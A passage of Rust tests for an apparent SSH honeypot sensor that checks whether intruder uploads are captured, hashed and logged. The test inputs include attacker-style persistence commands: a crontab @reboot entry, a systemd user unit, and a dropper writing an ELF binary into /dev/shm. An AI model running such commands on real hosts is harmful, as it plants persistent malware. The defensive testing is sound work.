    let cron = "(crontab -l 2>/dev/null; echo \"@reboot /dev/shm/w.sh\") \\\n  | crontab - 2>/dev/null; echo cron-done";
    assert_eq!(exec_status(&session, cron).await.0, "cron-done\n");

    let unit = b"[Unit]\nDescription=netai\n[Service]\nExecStart=/dev/shm/w.sh\n";
    let systemd = "sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service && echo unit-written'";
    assert_eq!(
        exec_with_stdin(&session, systemd, unit).await,
        ("unit-written\n".to_string(), 0)
    );
    assert_eq!(
        exec_stdout(
            &session,
            "cat /root/.config/systemd/user/watcher-netai.service"
        )
        .await,
        unit
    );

    let elf = elf_payload();
    let astats =
        "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && cat > astats";
    for _ in 0..3 {
        assert_eq!(
            exec_status(&session, "ps aux | grep astats | grep -v grep | wc -l").await,
            ("0\n".to_string(), 0)
        );
        assert_eq!(
            exec_with_stdin(&session, astats, &elf).await,
            (String::new(), 0)
        );
    }
    let (out, status) = exec_status(
        &session,
        "cd /dev/shm && ls -la astats; wc -c astats; md5sum astats",
    )
    .await;
    assert_eq!(status, 0, "{out}");
    let lines: Vec<&str> = out.lines().collect();
    assert!(
        lines[0].starts_with("-rw-r--r-- 1 root root 70000 ") && lines[0].ends_with(" astats"),
        "{out}"
    );
    assert_eq!(lines[1], "70000 astats");
    assert_eq!(lines[2], format!("{ELF_PAYLOAD_MD5}  astats"));

    drop(session);
    let events = uploads(&dir.path().join("events.jsonl"), 3).await;
    handle.abort();
    assert_eq!(events.len(), 3, "one capture per distinct body");
    let by_size = |size: usize| {
        events
            .iter()
            .find(|event| event.metadata["size"] == size as u64)
            .unwrap_or_else(|| panic!("no capture of {size} bytes: {events:?}"))
    };
    for (body, repeats, destination) in [
        (&script[..], 1, "/dev/shm/w.sh"),
        (
            &unit[..],
            1,
            "/root/.config/systemd/user/watcher-netai.service",
        ),
        (&elf[..], 3, "/dev/shm/astats"),
    ] {
        let event = by_size(body.len());
        let sample = event.sample.as_ref().unwrap();
        assert_eq!(sample.sha256, sha256_hex(body));
        assert_eq!(event.metadata["sha256"], sha256_hex(body));
        assert_eq!(event.metadata["capture_reason"], "exec_stdin");
        assert_eq!(event.metadata["end_reason"], "transfer_complete");
        assert_eq!(event.metadata["complete"], true);
        assert_eq!(event.metadata["truncated"], false);
        assert_eq!(event.metadata["repeat_count"], repeats);
        assert_eq!(event.metadata["destination"], destination);
        assert_eq!(
            std::fs::read(dir.path().join("spool").join(&sample.sha256)).unwrap(),
            body,
            "the spooled body is what was sent"
        );
    }
}

/// A client that streams a payload and never sends EOF holds the command until the session's
/// idle timeout; what arrived is captured, marked cut off by that timeout.
#[tokio::test]
async fn a_payload_without_eof_is_captured_as_cut_off_by_the_idle_timeout() {
    let dir = tempfile::tempdir().unwrap();
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        dir.path().join("events.jsonl"),
        dir.path().join("spool"),
        dir.path().join("host_key"),
        Arc::new(WanResolver::new(HashMap::new())),
        ConnectionBounds {
            idle_timeout: Duration::from_millis(800),
            ..test_bounds()
        },
        "OpenSSH_9.6p1".to_string(),
        "test".to_string(),
        dir.path().join("outbox"),
    )
    .await
    .unwrap();
    let session = login(addr).await;
    let channel = session.channel_open_session().await.unwrap();
    channel
        .exec(false, &b"cat > /tmp/partial"[..])
        .await
        .unwrap();
    channel.data(&b"\x7fELF-no-eof-follows"[..]).await.unwrap();
    let events = uploads(&dir.path().join("events.jsonl"), 1).await;
    handle.abort();
    let metadata = &events[0].metadata;
    assert_eq!(metadata["capture_reason"], "exec_stdin");
    assert_eq!(metadata["end_reason"], "idle_timeout");
    assert_eq!(metadata["complete"], false);
    assert_eq!(metadata["size"], 19);
    assert_eq!(metadata["command"], "cat > /tmp/partial");
    drop(channel);
}

/// A command that reads no input completes at the request even if the client never sends EOF
/// (an exec whose stdin stays open, as an SDK leaves it).
#[tokio::test]
async fn an_exec_that_reads_no_input_completes_without_eof() {
    let dir = tempfile::tempdir().unwrap();
    let (addr, handle) = start_server(dir.path()).await;
    let session = login(addr).await;
    let mut channel = session.channel_open_session().await.unwrap();
    channel
        .exec(false, &b"echo no-input-needed"[..])
        .await
        .unwrap();
    let mut out = Vec::new();
    let mut status = None;
    while let Some(message) = tokio::time::timeout(Duration::from_secs(2), channel.wait())
        .await
        .expect("a stdin-free command must not wait for EOF")
    {
        match message {
            russh::ChannelMsg::Data { data } => out.extend_from_slice(&data),
            russh::ChannelMsg::ExitStatus { exit_status } => status = Some(exit_status),
            russh::ChannelMsg::Close => break,
            _ => {}
        }
    }
    assert_eq!(
        (out.as_slice(), status),
        (&b"no-input-needed\n"[..], Some(0))
    );
    drop(session);
    handle.abort();
}

/// Read a pty shell channel until its output ends with the prompt.
async fn read_to_prompt(channel: &mut russh::Channel<russh::client::Msg>) -> String {
    let mut out = Vec::new();
    while !out.ends_with(b"# ") {
        match tokio::time::timeout(Duration::from_secs(10), channel.wait())
            .await
            .expect("timed out waiting for the prompt")
        {
            Some(russh::ChannelMsg::Data { data }) => out.extend_from_slice(&data),
            Some(russh::ChannelMsg::Eof | russh::ChannelMsg::Close) | None => break,
            Some(_) => {}
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// `cat > f` at an interactive shell takes the typed lines that follow as its input until
/// Ctrl-D, as a terminal does, echoing them; the file holds them and they are captured.
#[tokio::test]
async fn cat_at_the_shell_takes_typed_lines_until_ctrl_d_and_captures_them() {
    let dir = tempfile::tempdir().unwrap();
    let (addr, handle) = start_server(dir.path()).await;
    let session = login(addr).await;
    let mut channel = open_shell(&session).await;

    channel.data(&b"cat > /tmp/typed\r"[..]).await.unwrap();
    let echoed = tokio::time::timeout(Duration::from_millis(300), async {
        let mut out = Vec::new();
        while let Some(russh::ChannelMsg::Data { data }) = channel.wait().await {
            out.extend_from_slice(&data);
        }
        out
    })
    .await;
    assert!(echoed.is_err(), "no prompt while `cat` waits for its input");
    channel.data(&b"hello\rworld\r\x04"[..]).await.unwrap();
    let reply = read_to_prompt(&mut channel).await;
    assert!(
        reply.contains("hello\r\nworld\r\n") && reply.ends_with(":~# "),
        "{reply:?}"
    );
    let read_back = shell_line(&mut channel, "cat /tmp/typed").await;
    assert!(read_back.contains("hello\r\nworld\r\n"), "{read_back:?}");

    // Ctrl-C kills the reader: `^C`, a fresh line, the prompt, and status 130.
    channel
        .data(&b"cat > /tmp/cut\rkept\rlost\x03"[..])
        .await
        .unwrap();
    let reply = read_to_prompt(&mut channel).await;
    assert!(reply.contains("lost^C\r\n"), "{reply:?}");
    assert!(shell_line(&mut channel, "echo $?").await.contains("130"));

    drop(channel);
    drop(session);
    let events = uploads(&dir.path().join("events.jsonl"), 2).await;
    handle.abort();
    let typed = events
        .iter()
        .find(|event| event.metadata["size"] == 12)
        .expect("the typed file is captured");
    assert_eq!(typed.metadata["capture_reason"], "shell_stdin");
    assert_eq!(typed.metadata["end_reason"], "transfer_complete");
    assert_eq!(typed.metadata["destination"], "/tmp/typed");
    assert_eq!(
        typed.sample.as_ref().unwrap().sha256,
        sha256_hex(b"hello\nworld\n")
    );
    let cut = events
        .iter()
        .find(|event| event.metadata["size"] == 5)
        .expect("the interrupted input is captured");
    assert_eq!(cut.metadata["end_reason"], "peer_aborted");
    assert_eq!(cut.metadata["complete"], false);
}
